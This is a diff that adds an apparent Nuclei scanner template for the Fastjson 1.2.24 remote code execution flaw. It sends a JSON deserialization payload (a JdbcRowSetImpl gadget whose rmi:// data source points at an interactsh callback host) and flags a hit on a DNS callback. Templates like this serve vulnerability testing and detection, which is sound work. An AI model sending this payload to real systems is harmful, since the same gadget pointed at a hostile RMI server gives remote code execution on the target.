@@ -1,0 +1,24 @@
+id: fastjson-1-2-24-rce
+info:
+  name: Fastjson 1.2.24 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{reverse}}/1","autoCommit":true}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
